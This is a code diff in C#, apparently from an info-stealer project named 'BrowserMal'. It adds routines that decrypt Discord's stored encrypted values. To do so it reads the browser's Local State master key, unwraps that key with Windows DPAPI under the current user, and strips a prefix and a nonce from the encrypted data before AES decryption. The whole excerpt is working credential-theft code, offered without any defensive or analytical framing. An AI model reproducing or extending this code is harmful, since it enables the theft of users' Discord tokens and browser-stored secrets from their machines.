@@ -62,6 +62,14 @@ namespace BrowserMal.Encryption
             return DecryptNoKey(Encoding.Default.GetBytes(encrypted));
         }
 
+        public static string GetEncryptedValueDiscord(string encrypted, byte[] masterKey, bool isDiscord)
+        {
+            byte[] data = Convert.FromBase64String(encrypted);
+
+            PrepareDiscord(data, out byte[] nonce);
+            return Decrypt(data, masterKey, nonce, isDiscord);
+        }
+
         public static byte[] GetMasterKey(string basePath)
         {
             string path = FindLocalState(basePath);
@@ -80,8 +88,13 @@ namespace BrowserMal.Encryption
             return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
         }
 
-        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
+        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv, bool isDiscord = false)
         {
+            if (isDiscord)
+            {
+                encryptedBytes = encryptedBytes.Skip(15).ToArray();
+            }
+
             var decryptedValue = string.Empty;
             try
             {
@@ -101,6 +114,11 @@ namespace BrowserMal.Encryption
             }
 
             return decryptedValue;
+        }
+        public static void PrepareDiscord(byte[] encryptedData, out byte[] iv)
+        {
+            iv = new byte[12];
+            Array.Copy(encryptedData, 3, iv, 0, iv.Length);
         }
 
         public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
